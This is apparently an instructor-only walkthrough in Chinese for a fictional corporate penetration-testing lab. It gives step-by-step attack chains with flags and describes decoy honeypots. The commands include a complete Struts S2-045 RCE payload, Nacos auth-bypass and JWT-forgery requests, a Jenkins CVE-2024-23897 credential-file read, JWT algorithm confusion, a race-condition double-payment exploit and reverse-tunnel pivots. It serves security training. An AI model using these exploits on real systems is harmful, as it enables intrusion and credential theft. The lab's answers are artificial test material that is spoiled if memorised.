# 恒远集团内网渗透 — 讲师 walkthrough（精简版 slim）

> 讲师材料，不下发学员。精简版含 9 容器：nginx-edge/portal/soc-honeypot/supplier-portal/oa/redis/coredns/gitea/postgres。
> 不含 Nacos/Jenkins/Samba AD/fileserver（Path C 与部分 Path A/B 里程碑在精简版不可达）。
> 精简版 4 个真实 flag：dmz-foothold(150)/customer-pii(200)/oa-approval-race(350)/uber-git-history(300)，合计 1000。
> 参考 PoC 见本包 instructor/lab/tools/verify-slim.sh（15 项断言）。

---

# Path A — CVE 链（MEDIUM）

> ADMIN 攻略（剧透）。真实案例：Equifax 2017 (S2-045) + Nacos QVD-2023-6271。
> 需靶场已构建并起网（应用源码为下一阶段）。里程碑：dmz-foothold(150) → nacos-config(150) → db-pii(200)。

## A1. vhost 枚举 → 发现隐藏遗留资产

入口仅 `www.hengyuan.local`。supplier vhost 不直接可见，需枚举：

```bash
# 证书 SAN 泄露 (gen-ca.sh 刻意把 supplier 放进 SAN)
echo | openssl s_client -connect 127.0.0.1:443 -servername www.hengyuan.local 2>/dev/null \
  | openssl x509 -noout -text | grep -A1 "Subject Alternative Name"
#   DNS:www.hengyuan.local, DNS:hengyuan.local, DNS:supplier.hengyuan.local  ← 泄露

# robots.txt / 静态资源辅助
curl -k --resolve www.hengyuan.local:443:127.0.0.1 https://www.hengyuan.local/robots.txt
# nginx alias 尾斜杠 misconfig -> 路径穿越读内网配置
curl -k --resolve www.hengyuan.local:443:127.0.0.1 \
  https://www.hengyuan.local/static../upstream.conf.bak   # 泄露 supplier 内网名/端口
```

## A2. S2-045 RCE（CVE-2017-5638）→ DMZ foothold

supplier-portal = Struts 2.3.31 + Jakarta multipart 解析器。畸形 `Content-Type` 中 OGNL 执行：

```bash
curl -k --resolve supplier.hengyuan.local:443:127.0.0.1 \
  https://supplier.hengyuan.local/index.action \
  -H 'Content-Type: %{(#_=\'\''multipart/form-data\'\'').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['\''com.opensymphony.xwork2.ActionContext.container\'\'']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='\''id'\'').(#iswin=(@java.lang.System@getProperty('\''os.name'\'').toLowerCase().contains('\''win'\''))).(#cmds=(#iswin?{'\''cmd'\'','\''/c'\'',#cmd}:{'\''/bin/bash'\'','\''-c'\'',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}'
# 回显 uid=... (tomcat) -> RCE 确认
```

> D4 诱饵：`/server-status` 谎报 "Struts 2.5.30 patched"，但真实 2.3.31，S2-045 仍触发。**验证优于假设**。

取 flag（RCE 后读文件系统）：

```bash
# 将 #cmd 改为 'cat /opt/supplier/flag.txt' -> dmz-foothold
```

## A3. pivot 进 corp（supplier 双网卡 dmz+corp）

```bash
# 宿主机: ligolo-ng proxy
sudo ./proxy -selfcert -laddr 0.0.0.0:11601
# supplier (经 RCE 上传 agent): 回连 host.docker.internal
./agent -connect host.docker.internal:11601 -ignore-cert
# proxy 侧: 创建隧道 + 路由 172.30.3.0/24; TUN resolv.conf -> 172.30.3.53 (coredns)
```

chisel 替代：宿主 `chisel server -p 8000 --reverse`；supplier `chisel client host.docker.internal:8000 R:socks`。

## A4. Nacos 默认 key JWT 伪造 / serverIdentity 绕过 → 配置 loot

Nacos v2.5.1 + 弱默认 `token.secret.key`（Base64 of `SecretKey0123456789...`）+ `serverIdentity/security`。

```bash
# 方式1: serverIdentity 头绕过鉴权 (QVD-2023-6271)
curl -s 'http://172.30.3.30:8848/nacos/v1/cs/configs?dataId=postgres-prod.yaml&group=DEFAULT_GROUP' \
  -H 'serverIdentity: security'
# 方式2: 用默认 key 伪造 JWT (JJWT 0.x 静默 Base64 解码 key)
#   secret = base64decode("U2VjcmV0S2V5MDEyMzQ1...") ; 签 {"sub":"nacos","exp":...} HS256
curl -s 'http://172.30.3.30:8848/nacos/v1/cs/configs?dataId=flag-nacos.yaml&group=DEFAULT_GROUP&accessToken=<forged>'
```

> ⚠️ `User-Agent: Nacos-Server`（CVE-2021-29441）**仅 ≤1.4.0**，2.5.1 无效。勿用。

loot dataId：`postgres-prod.yaml`（hy_app 凭证）、`oa-admin.properties`（OA admin secret，接 Path B）、
`jenkins-deploy.yaml`、`redis.conf`、`flag-nacos.yaml`（**nacos-config flag**）。

## A5. postgres → 客户 PII（db-pii）

```bash
# 经 pivot 到 data 区 (fileserver/dc 双网卡) 或 corp 可达路径
PGPASSWORD='PgApp@2023' psql -h 172.30.5.20 -U hy_app -d hengyuan \
  -c "SELECT name,id_card,phone,note FROM customers;"
#   note 列含 db-pii flag (hy_app 可 SELECT customers)
#   crown_jewels 表 hy_app 无权限 -> 需 Path C superuser 凭证
```

员工密码复用（employees 表）→ OA 登录，接 Path B。
---

# Path B — 逻辑链（HARD）

> ADMIN 攻略（剧透）。真实案例：泛微/致远/用友风格 OA 业务逻辑洞 + Uber 2016 git 历史 + Jenkins CVE-2024-23897。
> 里程碑：oa-approval-bypass(350) → jenkins-creds(350) → gitea-sshkey(300)。
> 逻辑洞**非命名 CVE**，如实标注。需靶场已构建并起网（应用源码下一阶段）。

## B1. portal 接管财务专员（二选一）

### 方式1: 可预测重置 token
`/static/app.js` 开发注释 subtle 泄露算法 `md5(f"{uid}:{ts}")`；响应 `Date` 头泄露服务器时间；验证窗口 `now-60..now`（≤61 候选）。

```bash
# 1. IDOR 枚举员工 (顺序 uid, 无 authz)
curl -k https://www.hengyuan.local/api/users/1001/profile   # zhang_wei 财务专员
# 2. 触发重置, 读 Date 头取服务器 ts
curl -ki -X POST https://www.hengyuan.local/api/reset -d 'username=zhang_wei' | grep -i '^date:'
# 3. 离线枚举 md5(uid:ts) for ts in [now-60, now]
python3 - <<'PY'
import hashlib, email.utils, time
uid=1001; now=int(time.time())
for ts in range(now-60, now+1):
    print(hashlib.md5(f"{uid}:{ts}".encode()).hexdigest())
PY
# 4. 用候选 token 重置 zhang_wei 密码 -> 登录
```

### 方式2: JWT kid 路径穿越 + RS256→HS256 混淆
公钥 `/static/public.pem` 公开下载；`kid` 无规范化 + `algorithms=["HS256","RS256"]`。

```bash
curl -k https://www.hengyuan.local/static/public.pem -o public.pem
# 伪造 admin JWT: kid="../../../../app/static/public.pem", alg=HS256, secret=PEM 文件内容
python3 - <<'PY'
import jwt
secret=open("public.pem","rb").read()
tok=jwt.encode({"sub":"admin","role":"admin"}, secret, algorithm="HS256",
               headers={"kid":"../../../../app/static/public.pem"})
print(tok)
PY
```

## B2. OA IDOR + 批量赋值 / 状态机缺陷 → 自审批

OA 模型 `Approval{id,dept,owner_uid,amount,vendor,status,current_step,approvals[],is_paid}`，步骤 `[dept_manager, finance_clerk, finance_director]`。

```bash
# IDOR: 顺序 ID, 仅部门校验 -> 枚举财务审批单
curl -s -H "Authorization: Bearer $TOK" http://172.30.3.31:8000/api/approvals/1
# GET 泄露额外字段 status/current_step/is_paid

# 批量赋值: PUT 无字段白名单 (for k,v in body.items(): setattr(a,k,v))
curl -s -X PUT -H "Authorization: Bearer $TOK" -H 'Content-Type: application/json' \
  http://172.30.3.31:8000/api/approvals/1 \
  -d '{"status":"approved","current_step":3,"is_paid":false}'

# 或 状态机缺陷: withdraw->resubmit 重置 current_step=0 但不清 approvals[];
#   /pay 门控 len(approvals)>=3 忽略 step/who
#   2 审批 + withdraw + resubmit + 1 审批 = 3 approvals 绕过财务总监(li_na)
```

## B3. OA 竞态双付 → vendor token + flag

`/pay` 用 **sync def**（threadpool 真并行）+ `time.sleep(0.1)` 窗口；check `not is_paid` 与 set 之间可 interleaving。

```bash
# 两并发 POST /pay -> 双付款 -> 双 vendor token + oa-approval-bypass flag
for i in 1 2; do
  curl -s -X POST -H "Authorization: Bearer $TOK" \
    http://172.30.3.31:8000/api/approvals/1/pay &
done; wait
# 响应含 vendor API token (接 Jenkins) + flag
```

> 构建期须 2 并发测试验证（纯 async 无 await 不可靠）。

## B4. Jenkins CVE-2024-23897 → 凭证解密 → admin

Jenkins 2.426.2-lts-jdk17；JCasC `Overall/Read:anonymous`（使 CLI `@file` **全文读取**）。

```bash
# 下载 CLI
curl -s http://172.30.3.40:8080/jnlpJars/jenkins-cli.jar -o jenkins-cli.jar
# args4j expandAtFiles: @file 全文读 (匿名 Overall/Read)
java -jar jenkins-cli.jar -s http://172.30.3.40:8080/ -http connect-node "@/var/jenkins_home/credentials.xml"
java -jar jenkins-cli.jar -s http://172.30.3.40:8080/ -http connect-node "@/var/jenkins_home/secrets/master.key"
java -jar jenkins-cli.jar -s http://172.30.3.40:8080/ -http connect-node "@/var/jenkins_home/secrets/hudson.util.Secret"
# 离线解密 credentials.xml (master.key + hudson.util.Secret) -> admin 密码 / gitea-admin / jenkins-creds-flag
```

> D6 诱饵：匿名 `backup-dc` job 看似 juicy 但沙箱化、无真实凭证。

## B5. Jenkins admin → Script Console RCE → pivot devops

```bash
# admin 登录 -> /script
println "id".execute().text
# jenkins 双网卡 corp+devops -> ligolo/chisel pivot 进 devops (172.30.4.0/24)
```

## B6. Gitea hyadmin → infra-deploy 历史 → SSH key（Uber）

```bash
# hyadmin (解密所得) 登录 gitea.devops.hengyuan.local:3000
git clone http://hyadmin:GiteaAdmin@2023@172.30.4.20:3000/hengyuan/infra-deploy.git
cd infra-deploy
git log --all --full-history -- deploy/id_rsa
git show <c1>:deploy/id_rsa > id_rsa     # 提交后又"删除"的私钥仍可恢复
#   同 commit 含 aws-credentials + gitea-sshkey flag
chmod 600 id_rsa
```

## B7. ssh deploy@fileserver → IT-Backup（接 Path C）

```bash
ssh -i id_rsa deploy@172.30.3.50    # 或经 pivot 172.30.5.50
ls /srv/shares/IT-backup/
#   dc-sam.ldb.bak (krbtgt->黄金票据), postgres-superuser.yaml (crown), svc_backup-creds.txt (Path C)
```
---

# 诱饵系统（D1–D6）— 验证纪律

> ADMIN 文档。诱饵计 **0 分**并触发蓝队告警叙事，教"验证优于假设"。
> 每个诱饵看似 juicy，但经不起验证；真实路径需实际利用确认。

| 诱饵 | 位置 | 看似 | 实际 | 验证方法 |
|---|---|---|---|---|
| **D1** | portal `/admin`（admin:admin123）| 管理后台 + flag | soc-honeypot 假面板，无真实数据，记录每个动作到 volume + 假告警 | 登录后数据为空/假；honeypot_logs 有记录；flag 计 0 分 |
| **D2** | portal `/api/search` | SQLi（假 MySQL 错误字符串）| **参数化查询**，sqlmap 无果，限流 + 告警 | sqlmap 跑不出注入；错误字符串是固定假返回 |
| **D3** | supplier `/.git` 可 dump | 泄露凭证 backup_admin/BackupAdmin@2023 | 假凭证**仅在 honeypot 生效**，不触真实服务；rabbit-hole README | 用凭证登录真实服务失败；仅 honeypot 接受 |
| **D4** | supplier `/server-status` | "Struts 2.5.30 (patched)" banner | 真实 2.3.31，**S2-045 仍触发** | 实际打 S2-045 PoC 回显 `id`（banner 谎报）|
| **D5** | nginx web 根 `/flag.txt` | flag + 提示 | 假 flag（0 分）| verify.py 判定 decoy |
| **D6** | Jenkins 匿名 `backup-dc` job | 域控备份脚本（juicy）| 沙箱化，无真实凭证，假 flag | 读 job 配置/日志无真实 secrets；flag 计 0 分 |

## 设计意图

- **区分度**：诱饵吸引"假设即结论"的攻击者；真实链需逐步验证（RCE 回显、hash 可 crack、凭证可登录、flag 可校验）。
- **蓝队叙事**：soc-honeypot 记录 D1/D3 触碰，模拟 SOC 告警；教学"攻击会留痕"。
- **诚实**：D4 刻意谎报版本，但真实漏洞仍在——教"banner 不可信，实测为准"。

## 验证助手

```bash
bash tools/decoy-check.sh    # 断言 D1 honeypot 日志+0分 / D2 sqlmap 无果 / D3 假凭证仅 honeypot / D4 banner 谎报但 S2-045 触发 / D5 0分 / D6 沙箱
```

> 诱饵 flag 字符串见 `docs/flags.md`（ADMIN-ONLY）。全部以 `_000000` 结尾，便于识别。